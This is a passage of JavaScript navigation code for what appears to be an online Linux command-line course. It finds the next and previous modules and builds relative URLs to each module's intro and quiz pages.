        const ids = Object.keys(MODULES);
        const index = ids.indexOf(moduleId);
        if (index === -1 || index === ids.length - 1) {
            return null;
        }
        return ids[index + 1];
    }

    /**
     * Get the previous module
     * @param {string} moduleId - Current module ID
     * @returns {string|null} Previous module ID or null if first
     */
    function getPreviousModule(moduleId) {
        const ids = Object.keys(MODULES);
        const index = ids.indexOf(moduleId);
        if (index <= 0) {
            return null;
        }
        return ids[index - 1];
    }

    /**
     * Get the URL to the next module's INTRO page (not the lab)
     * This implements the correct learning flow: Lab → Next Intro → Quiz → Lab
     * @param {string} moduleId - Current module ID (e.g., 'CLH-002')
     * @returns {object} { url: string, isLast: boolean, nextModuleId: string|null }
     */
    function getNextIntroUrl(moduleId) {
        const nextModuleId = getNextModule(moduleId);

        if (!nextModuleId) {
            // This is the last module - return to Script House
            return {
                url: '../../index.html',
                isLast: true,
                nextModuleId: null
            };
        }

        // Extract the number from CLH-XXX format
        const match = nextModuleId.match(/CLH-(\d+)/i);
        if (!match) {
            return {
                url: '../../index.html',
                isLast: true,
                nextModuleId: null
            };
        }

        const nextNum = match[1]; // e.g., '003'

        // From lab (applets/linux/), intro is at ../../clh/clh-XXX-intro.html
        return {
            url: `../../clh/clh-${nextNum}-intro.html`,
            isLast: false,
            nextModuleId: nextModuleId
        };
    }

    /**
     * Get the URL to the current module's intro page
     * @param {string} moduleId - Module ID (e.g., 'CLH-002')
     * @returns {string} URL to intro page
     */
    function getIntroUrl(moduleId) {
        const match = moduleId.match(/CLH-(\d+)/i);
        if (!match) return '../../clh/clh-001-intro.html';
        return `../../clh/clh-${match[1]}-intro.html`;
    }

    /**
     * Get the URL to the current module's quiz page
     * @param {string} moduleId - Module ID (e.g., 'CLH-002')
     * @returns {string} URL to quiz page
     */
    function getQuizUrl(moduleId) {
        const match = moduleId.match(/CLH-(\d+)/i);
        if (!match) return '../../clh/clh-001-quiz.html';
        return `../../clh/clh-${match[1]}-quiz.html`;
    }

    // ═══════════════════════════════════════════════════════════════
    // EXPOSE PUBLIC API
    // ═══════════════════════════════════════════════════════════════

    return {
        getModule,
        getAllModuleIds,
        getModulesByTier,
        getTier,
        getAllTiers,
        isValidModule,
        getNextModule,
        getPreviousModule,
        getNextIntroUrl,
        getIntroUrl,
        getQuizUrl,

        // Expose constants for debugging
        _MODULES: MODULES,
        _TIERS: TIERS,
    };

})();
